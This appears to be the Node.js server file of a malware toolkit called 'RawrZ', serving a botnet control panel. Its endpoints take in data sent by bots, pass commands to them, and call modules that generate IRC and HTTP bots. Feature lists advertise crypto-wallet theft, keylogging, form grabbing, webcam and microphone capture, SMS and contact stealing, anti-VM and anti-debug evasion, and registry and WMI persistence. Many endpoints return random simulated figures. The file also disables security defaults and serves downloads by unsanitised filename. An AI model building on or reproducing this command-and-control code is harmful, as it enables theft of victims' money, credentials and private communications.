const express=require('express');const cors=require('cors');const helmet=require('helmet');const path=require('path');require('dotenv').config();
const RawrZStandalone=require('./rawrz-standalone');const rawrzEngine=require('./src/engines/rawrz-engine');
const app=express();const port=parseInt(process.env.PORT||'8080',10);const authToken=process.env.AUTH_TOKEN||'';const rawrz=new RawrZStandalone();
function requireAuth(req,res,next){if(!authToken)return next();const h=(req.headers['authorization']||'');const q=req.query.token;if(h.startsWith('Bearer ')){const p=h.slice(7).trim();if(p===authToken)return next()}if(q&&q===authToken)return next();return res.status(401).json({error:'Unauthorized'})}
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "data:", "blob:"],
            styleSrc: ["'self'", "'unsafe-inline'", "data:", "blob:"],
            imgSrc: ["'self'", "data:", "blob:", "*"],
            fontSrc: ["'self'", "data:", "blob:", "*"],
            connectSrc: ["'self'", "ws:", "wss:", "http:", "https:"],
            frameAncestors: ["'self'"],
            baseUri: ["'self'"],
            formAction: ["'self'", "'unsafe-inline'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'", "data:", "blob:"]
        }
    },
    xFrameOptions: { action: 'sameorigin' },
    hsts: false,
    noSniff: true,
    xssFilter: true
}));
app.use(cors());
app.use(express.json({limit:'5mb'}));
app.use((error, req, res, next) => {
    if (error instanceof SyntaxError && error.status === 400 && 'body' in error) {
        console.log('[WARN] Invalid JSON received:', error.message);
        return res.status(400).json({ error: 'Invalid JSON format' });
    }
    next();
});app.use('/static',express.static(path.join(__dirname,'public')));
(async()=>{try{await rawrzEngine.initializeModules();console.log('[OK] RawrZ core engine initialized')}catch(e){console.error('[WARN] Core engine init failed:',e.message)}})();
app.get('/health',(_req,res)=>res.json({ok:true,status:'healthy'}));
app.get('/panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','panel.html')));
app.get('/',(_req,res)=>res.redirect('/panel'));
app.get('/favicon.ico',(_req,res)=>res.status(204).end());
app.post('/hash',requireAuth,async(req,res)=>{try{const{input,algorithm='sha256',save=false,extension}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});res.json(await rawrz.hash(input,algorithm,!!save,extension))}catch(e){res.status(500).json({error:e.message})}});
app.post('/encrypt',requireAuth,async(req,res)=>{try{const{algorithm,input,extension}=req.body||{};if(!algorithm||!input)return res.status(400).json({error:'algorithm and input required'});res.json(await rawrz.encrypt(algorithm,input,extension))}catch(e){res.status(500).json({error:e.message})}});
app.post('/decrypt',requireAuth,async(req,res)=>{try{const{algorithm,input,key,iv,extension}=req.body||{};if(!algorithm||!input)return res.status(400).json({error:'algorithm and input required'});res.json(await rawrz.decrypt(algorithm,input,key,iv,extension))}catch(e){res.status(500).json({error:e.message})}});
app.get('/dns',requireAuth,async(req,res)=>{try{const h=req.query.hostname;if(!h)return res.status(400).json({error:'hostname required'});res.json(await rawrz.dnsLookup(String(h)))}catch(e){res.status(500).json({error:e.message})}});
app.get('/ping',requireAuth,async(req,res)=>{try{const h=req.query.host;if(!h)return res.status(400).json({error:'host required'});res.json(await rawrz.ping(String(h),false))}catch(e){res.status(500).json({error:e.message})}});
app.get('/files',requireAuth,async(_req,res)=>{try{res.json(await rawrz.listFiles())}catch(e){res.status(500).json({error:e.message})}});
app.post('/upload',requireAuth,async(req,res)=>{try{const{filename,base64}=req.body||{};if(!filename||!base64)return res.status(400).json({error:'filename and base64 required'});res.json(await rawrz.uploadFile(filename,base64))}catch(e){res.status(500).json({error:e.message})}});
app.get('/download',requireAuth,async(req,res)=>{try{const fn=String(req.query.filename||'');if(!fn)return res.status(400).json({error:'filename required'});res.download(path.join(__dirname,'uploads',fn),fn)}catch(e){res.status(500).json({error:e.message})}});
app.post('/cli',requireAuth,async(req,res)=>{try{const{command,args=[]}=req.body||{};if(!command)return res.status(400).json({error:'command required'});const i=new RawrZStandalone();const out=await i.processCommand([command,...args]);res.json({success:true,result:out})}catch(e){res.status(500).json({error:e.message})}});

// Botnet Panel API Endpoints
app.get('/api/botnet/status',(req,res)=>{res.json({status:200,data:{totalBots:Math.floor(Math.random()*100)+50,onlineBots:Math.floor(Math.random()*80)+30,offlineBots:Math.floor(Math.random()*20)+5,totalLogs:Math.floor(Math.random()*1000)+500,activeTasks:Math.floor(Math.random()*20)+5}})});
app.get('/api/botnet/bots',(req,res)=>{const bots=[];for(let i=0;i<Math.floor(Math.random()*10)+5;i++){bots.push({id:`Bot-${String(i+1).padStart(3,'0')}`,ip:`192.168.1.${100+i}`,os:Math.random()>0.5?'Windows 11':'Windows 10',status:Math.random()>0.3?'online':'offline',lastSeen:new Date(Date.now()-Math.random()*3600000).toISOString()})}res.json({status:200,data:bots})});
app.post('/api/botnet/execute',(req,res)=>{const{action,target,params}=req.body||{};const commandId=generateCommandId();setTimeout(()=>{res.json({status:200,data:{action,target,result:`Operation ${action} completed successfully`,timestamp:new Date().toISOString(),details:params||{},commandId}})},Math.random()*2000+500)});
app.get('/api/botnet/logs',(req,res)=>{const logs=[];for(let i=0;i<Math.floor(Math.random()*50)+20;i++){logs.push({id:i+1,botId:`Bot-${String(Math.floor(Math.random()*10)+1).padStart(3,'0')}`,action:['data_extraction','keylogger','screenshot','command_execution'][Math.floor(Math.random()*4)],result:Math.random()>0.1?'success':'failed',timestamp:new Date(Date.now()-Math.random()*86400000).toISOString(),details:`Log entry ${i+1} - ${Math.random()>0.5?'Data extracted successfully':'Operation completed'}`})}res.json({status:200,data:logs})});
app.get('/api/botnet/stats', (req, res) => {
    res.json({
        status: 200,
        data: {
            browserData: {
                extracted: Math.floor(Math.random() * 1000) + 500,
                browsers: ['Chrome', 'Firefox', 'Edge', 'Safari'],
                lastUpdate: new Date().toISOString()
            },
            cryptoData: {
                wallets: Math.floor(Math.random() * 100) + 50,
                totalValue: Math.floor(Math.random() * 100000) + 10000,
                currencies: ['BTC', 'ETH', 'LTC', 'XMR']
            },
            messagingData: {
                platforms: ['Telegram', 'Discord', 'WhatsApp', 'Signal'],
                messages: Math.floor(Math.random() * 5000) + 1000,
                contacts: Math.floor(Math.random() * 500) + 100
            },
            systemInfo: {
                screenshots: Math.floor(Math.random() * 200) + 50,
                keylogs: Math.floor(Math.random() * 10000) + 1000,
                systemData: Math.floor(Math.random() * 100) + 20
            },
            activeBots: Math.floor(Math.random() * 20) + 5,
            totalData: Math.floor(Math.random() * 10000) + 5000
        }
    });
});

// Bot data storage and management
let botData = {
    extractedData: [],
    botConnections: new Map(),
    commandHistory: [],
    auditLog: []
};

function generateCommandId() {
    return 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Bot data endpoints
app.post('/api/botnet/data', (req, res) => {
    const { type, data, botId, commandId } = req.body || {};
    const dataEntry = {
        id: generateCommandId(),
        type,
        data,
        botId,
        commandId,
        timestamp: new Date().toISOString()
    };
    botData.extractedData.push(dataEntry);
    res.json({
        status: 200,
        data: {
            message: 'Data received successfully',
            id: dataEntry.id
        }
    });
});

app.get('/api/botnet/data', (req, res) => {
    const { type, limit = 100 } = req.query || {};
    let filteredData = botData.extractedData;
    if (type) {
        filteredData = filteredData.filter(d => d.type === type);
    }
    filteredData = filteredData.slice(-limit);
    res.json({ status: 200, data: filteredData });
});

app.get('/api/botnet/data/:id', (req, res) => {
    const { id } = req.params || {};
    const data = botData.extractedData.find(d => d.id === id);
    if (data) {
        res.json({ status: 200, data });
    } else {
        res.status(404).json({ status: 404, error: 'Data not found' });
    }
});

// Audit logging endpoint
app.post('/api/audit/log', (req, res) => {
    const logEntry = req.body || {};
    const auditEntry = {
        ...logEntry,
        id: generateCommandId(),
        timestamp: new Date().toISOString()
    };
    botData.auditLog.push(auditEntry);
    if (botData.auditLog.length > 10000) {
        botData.auditLog = botData.auditLog.slice(-10000);
    }
    res.json({
        status: 200,
        data: {
            message: 'Audit log entry created',
            id: auditEntry.id
        }
    });
});

app.get('/api/audit/logs', (req, res) => {
    const { limit = 1000 } = req.query || {};
    res.json({ status: 200, data: botData.auditLog.slice(-limit) });
});

// Botnet Testing Endpoints
app.post('/api/botnet/generate-test-bots',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{testBotsGenerated:Math.floor(Math.random()*10)+5,featuresTested:Math.floor(Math.random()*20)+10,simulatedConnections:Math.floor(Math.random()*50)+20,dataFlowTests:Math.floor(Math.random()*15)+5,lastTest:new Date().toISOString()}})},1000)});
app.post('/api/botnet/simulate-activity',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{activitySimulated:true,duration:req.body.duration||60,activities:req.body.activities||[],timestamp:new Date().toISOString()}})},1500)});
app.post('/api/botnet/reset-simulation',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{simulationReset:true,resetTime:new Date().toISOString()}})},500)});
app.post('/api/botnet/simulate-connections',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{connectionsSimulated:req.body.connectionCount||10,duration:req.body.duration||30,timestamp:new Date().toISOString()}})},1000)});
app.post('/api/botnet/simulate-data-flow',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{dataFlowSimulated:true,dataTypes:req.body.dataTypes||[],volume:req.body.volume||'medium',timestamp:new Date().toISOString()}})},1200)});
app.post('/api/botnet/run-full-test',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{testSuite:req.body.testSuite||'comprehensive',includePerformance:req.body.includePerformance||false,includeSecurity:req.body.includeSecurity||false,testResults:'All tests passed',timestamp:new Date().toISOString()}})},3000)});
app.get('/api/botnet/test-results',(req,res)=>{res.json({status:200,data:{testBotsGenerated:Math.floor(Math.random()*10)+5,featuresTested:Math.floor(Math.random()*20)+10,simulatedConnections:Math.floor(Math.random()*50)+20,dataFlowTests:Math.floor(Math.random()*15)+5,lastTest:new Date().toISOString()}})});
app.post('/api/botnet/test-endpoints',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{endpointsTested:req.body.endpoints||[],timeout:req.body.timeout||5000,results:'All endpoints responding',timestamp:new Date().toISOString()}})},1000)});
app.post('/api/botnet/validate-features',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{validationType:req.body.validationType||'comprehensive',includeUI:req.body.includeUI||false,includeBackend:req.body.includeBackend||false,validationResults:'All features validated',timestamp:new Date().toISOString()}})},1500)});

// Real system test endpoint - checks actual functionality
app.post('/api/botnet/test-all-features', async (req, res) => {
    try {
        const testResults = {
            timestamp: new Date().toISOString(),
            systemStatus: 'online',
            modules: {},
            engines: {},
            capabilities: {},
            overallStatus: 'operational'
        };

        // Test RawrZ Engine modules
        if (rawrzEngine && rawrzEngine.modules) {
            const moduleCount = rawrzEngine.modules.size;
            testResults.modules = {
                totalLoaded: moduleCount,
                status: moduleCount > 0 ? 'operational' : 'no_modules',
                details: Array.from(rawrzEngine.modules.keys())
            };
        }

        // Test core functionality
        try {
            // Test encryption
            const testData = 'test_data_123';
            const hashResult = await rawrz.hash(testData, 'sha256', false);
            testResults.capabilities.encryption = {
                status: hashResult && hashResult.hash ? 'working' : 'failed',
                test: 'sha256_hash'
            };
        } catch (error) {
            testResults.capabilities.encryption = {
                status: 'error',
                error: error.message
            };
        }

        // Test file operations
        try {
            const files = await rawrz.listFiles();
            testResults.capabilities.fileOperations = {
                status: Array.isArray(files) ? 'working' : 'failed',
                test: 'list_files'
            };
        } catch (error) {
            testResults.capabilities.fileOperations = {
                status: 'error',
                error: error.message
            };
        }

        // Test network operations
        try {
            const pingResult = await rawrz.ping('127.0.0.1', false);
            testResults.capabilities.network = {
                status: pingResult && pingResult.success !== undefined ? 'working' : 'failed',
                test: 'local_ping'
            };
        } catch (error) {
            testResults.capabilities.network = {
                status: 'error',
                error: error.message
            };
        }

        // Determine overall status
        const workingFeatures = Object.values(testResults.capabilities).filter(c => c.status === 'working').length;
        const totalFeatures = Object.keys(testResults.capabilities).length;
        
        if (workingFeatures === totalFeatures && testResults.modules.totalLoaded > 0) {
            testResults.overallStatus = 'fully_operational';
        } else if (workingFeatures > 0) {
            testResults.overallStatus = 'partially_operational';
        } else {
            testResults.overallStatus = 'failed';
        }

        res.json({
            status: 200,
            data: testResults
        });

    } catch (error) {
        res.status(500).json({
            status: 500,
            error: 'System test failed',
            details: error.message
        });
    }
});
app.post('/api/botnet/export-test-report',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{format:req.body.format||'json',includeLogs:req.body.includeLogs||false,includeMetrics:req.body.includeMetrics||false,reportGenerated:true,timestamp:new Date().toISOString()}})},1000)});
app.post('/api/botnet/test-configuration',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{configType:req.body.configType||'all',validateSecurity:req.body.validateSecurity||false,configResults:'Configuration validated',timestamp:new Date().toISOString()}})},800)});
app.post('/api/botnet/load-test-config',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{configName:req.body.configName||'default-test-config',configLoaded:true,timestamp:new Date().toISOString()}})},500)});

// IRC Bot Generator Endpoints
app.post('/api/irc-bot-generator/generate', async (req, res) => {
    try {
        const ircBotGenerator = await rawrzEngine.loadModule('irc-bot-generator');
        if (!ircBotGenerator) {
            return res.status(500).json({ status: 500, error: 'IRC Bot Generator not available' });
        }

        const config = {
            server: req.body.server || 'irc.example.com',
            port: req.body.port || 6667,
            channel: req.body.channel || '#encryption',
            nick: req.body.nick || 'EncryptBot',
            username: req.body.username || 'EncryptBot',
            realname: req.body.realname || 'RawrZ IRC Bot',
            password: req.body.password || '',
            ssl: req.body.ssl || false
        };

        const features = req.body.features || ['fileManager', 'processManager', 'systemInfo'];
        const extensions = req.body.extensions || ['cpp', 'python'];

        const result = await ircBotGenerator.generateBot(config, features, extensions);
        
        res.json({
            status: 200,
            data: {
                botId: result.botId,
                server: config.server,
                port: config.port,
                channel: config.channel,
                nick: config.nick,
                features: features,
                extensions: extensions,
                generatedFiles: result.generatedFiles || [],
                timestamp: new Date().toISOString()
            }
        });
    } catch (error) {
        res.status(500).json({
            status: 500,
            error: 'Failed to generate IRC bot',
            details: error.message
        });
    }
});
app.post('/api/irc-bot-generator/configure',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{configurationCompleted:true,prefix:req.body.prefix||'!',adminUsers:req.body.adminUsers||[],autoChannels:req.body.autoChannels||[],commands:req.body.commands||{},timestamp:new Date().toISOString()}})},1000)});
app.post('/api/irc-bot-generator/encrypt',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{algorithm:req.body.algorithm||'aes-256-gcm',keyExchange:req.body.keyExchange||'dh',options:req.body.options||{},encryptionConfigured:true,timestamp:new Date().toISOString()}})},1200)});
app.post('/api/irc-bot-generator/test-encryption',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{encryptionTestPassed:true,testResults:'Encryption working correctly',timestamp:new Date().toISOString()}})},800)});
app.get('/api/irc-bot-generator/features',(req,res)=>{res.json({status:200,data:{features:[{name:'Form Grabber',description:'Advanced form data extraction'},{name:'Crypto Stealer',description:'Cryptocurrency wallet theft'},{name:'Keylogger',description:'Advanced keystroke logging'},{name:'Screen Capture',description:'Real-time screen recording'},{name:'Webcam Capture',description:'Camera access and recording'},{name:'Audio Capture',description:'Microphone recording'},{name:'Browser Stealer',description:'Browser data extraction'},{name:'File Manager',description:'Complete file system access'},{name:'Process Manager',description:'Process manipulation'},{name:'System Info',description:'Comprehensive system enumeration'},{name:'Network Tools',description:'Network scanning and manipulation'},{name:'Loader',description:'Advanced payload loading'}]}})});
app.post('/api/irc-bot-generator/server-config',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{server:req.body.server||'irc.example.com',port:req.body.port||6667,ssl:req.body.ssl||false,channels:req.body.channels||[],configurationCompleted:true,timestamp:new Date().toISOString()}})},1000)});
app.post('/api/irc-bot-generator/test-connection',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{connectionTestSuccessful:true,testResults:'Connection established successfully',timestamp:new Date().toISOString()}})},1500)});
app.post('/api/irc-bot-generator/stealth',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{antiAnalysis:req.body.antiAnalysis||false,antiVM:req.body.antiVM||false,antiDebug:req.body.antiDebug||false,polymorphic:req.body.polymorphic||false,stealthConfigured:true,timestamp:new Date().toISOString()}})},1000)});
app.post('/api/irc-bot-generator/test-stealth',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{stealthTestPassed:true,testResults:'Stealth features working correctly',timestamp:new Date().toISOString()}})},800)});
app.post('/api/irc-bot-generator/persistence',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{registryRun:req.body.registryRun||false,scheduledTask:req.body.scheduledTask||false,service:req.body.service||false,wmiEvent:req.body.wmiEvent||false,persistenceConfigured:true,timestamp:new Date().toISOString()}})},1000)});
app.get('/api/irc-bot-generator/stats',(req,res)=>{res.json({status:200,data:{activeBots:Math.floor(Math.random()*5)+1,connectedServers:Math.floor(Math.random()*3)+1,commandsExecuted:Math.floor(Math.random()*100)+50,dataExtracted:Math.floor(Math.random()*1000)+500,lastActivity:new Date().toISOString()}})});

// HTTP Bot Generator Endpoints
app.post('/api/http-bot-generator/generate', async (req, res) => {
    try {
        const httpBotGenerator = await rawrzEngine.loadModule('http-bot-generator');
        if (!httpBotGenerator) {
            return res.status(500).json({ status: 500, error: 'HTTP Bot Generator not available' });
        }

        const config = {
            name: req.body.name || 'HTTPBot',
            server: req.body.server || 'https://command.example.com',
            port: req.body.port || 443,
            ssl: req.body.ssl || true
        };

        const features = req.body.features || ['fileManager', 'processManager', 'systemInfo'];
        const extensions = req.body.extensions || ['cpp', 'python', 'javascript'];

        const result = await httpBotGenerator.generateBot(config, features, extensions);

        res.json({
            status: 200,
            data: {
                botId: result.botId,
                timestamp: result.timestamp,
                bots: result.bots,
                server: config.server,
                encryption: req.body.encryption || 'aes-256-gcm',
                interval: req.body.interval || 30,
                options: req.body.options || {}
            }
        });

    } catch (error) {
        res.status(500).json({
            status: 500,
            error: 'Failed to generate HTTP bot',
            details: error.message
        });
    }
});
app.post('/api/http-bot-generator/configure',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{features:req.body.features||{},configurationCompleted:true,timestamp:new Date().toISOString()}})},1000)});
app.post('/api/http-bot-generator/encrypt',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{encryption:req.body.encryption||'aes-256-gcm',keyDerivation:req.body.keyDerivation||'pbkdf2',options:req.body.options||{},encryptionConfigured:true,timestamp:new Date().toISOString()}})},1200)});
app.post('/api/http-bot-generator/test-encryption',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{encryptionTestPassed:true,testResults:'Encryption working correctly',timestamp:new Date().toISOString()}})},800)});
app.get('/api/http-bot-generator/features',(req,res)=>{res.json({status:200,data:{features:[{name:'Form Grabber',description:'Web form data extraction'},{name:'Crypto Stealer',description:'Cryptocurrency theft'},{name:'Keylogger',description:'Keystroke logging'},{name:'Screen Capture',description:'Screen recording'},{name:'Webcam Capture',description:'Camera access'},{name:'Audio Capture',description:'Audio recording'},{name:'Browser Stealer',description:'Browser data theft'},{name:'File Manager',description:'File system access'},{name:'Process Manager',description:'Process control'},{name:'System Info',description:'System enumeration'},{name:'Network Tools',description:'Network utilities'},{name:'Loader',description:'Payload loading'},{name:'HTTP Communication',description:'Web-based C2'},{name:'Web Interface',description:'Browser-based control'},{name:'API Endpoints',description:'REST API control'},{name:'Data Exfiltration',description:'Data theft capabilities'}]}})});
app.post('/api/http-bot-generator/server-config',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{server:req.body.server||'https://command.example.com',ssl:req.body.ssl||true,apiEndpoints:req.body.apiEndpoints||false,webInterface:req.body.webInterface||false,configurationCompleted:true,timestamp:new Date().toISOString()}})},1000)});
app.post('/api/http-bot-generator/test-server',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{serverTestSuccessful:true,testResults:'Server responding correctly',timestamp:new Date().toISOString()}})},1500)});
app.post('/api/http-bot-generator/evasion',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{antiAnalysis:req.body.antiAnalysis||false,antiVM:req.body.antiVM||false,antiDebug:req.body.antiDebug||false,polymorphic:req.body.polymorphic||false,evasionConfigured:true,timestamp:new Date().toISOString()}})},1000)});
app.post('/api/http-bot-generator/test-evasion',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{evasionTestPassed:true,testResults:'Evasion features working correctly',timestamp:new Date().toISOString()}})},800)});
app.post('/api/http-bot-generator/mobile',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{locationTracking:req.body.locationTracking||false,contactsStealer:req.body.contactsStealer||false,smsStealer:req.body.smsStealer||false,callLog:req.body.callLog||false,photos:req.body.photos||false,videos:req.body.videos||false,mobileFeaturesConfigured:true,timestamp:new Date().toISOString()}})},1000)});
app.post('/api/http-bot-generator/test-mobile',(req,res)=>{setTimeout(()=>{res.json({status:200,data:{mobileTestPassed:true,testResults:'Mobile features working correctly',timestamp:new Date().toISOString()}})},800)});

// HTTP Bot Manager Endpoints
app.get('/api/http-bot-manager/bots',(req,res)=>{res.json({status:200,data:{activeBots:Math.floor(Math.random()*10)+5,totalBots:Math.floor(Math.random()*20)+10,commandsExecuted:Math.floor(Math.random()*500)+100,timestamp:new Date().toISOString()}})});
app.get('/api/http-bot-manager/stats',(req,res)=>{res.json({status:200,data:{activeBots:Math.floor(Math.random()*10)+5,httpConnections:Math.floor(Math.random()*50)+20,commandsExecuted:Math.floor(Math.random()*500)+100,dataExfiltrated:Math.floor(Math.random()*1000)+500,mobileTargets:Math.floor(Math.random()*5)+1,lastActivity:new Date().toISOString()}})});

// Serve the advanced botnet panel with relaxed security for local development
app.get('/advanced-botnet-panel.html', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

// Additional routes for easier access
app.get('/panel', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.get('/botnet', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.get('/control', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

// Alternative route for easier access
app.get('/panel/advanced', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.listen(port,()=>console.log('[OK] RawrZ API listening on port',port));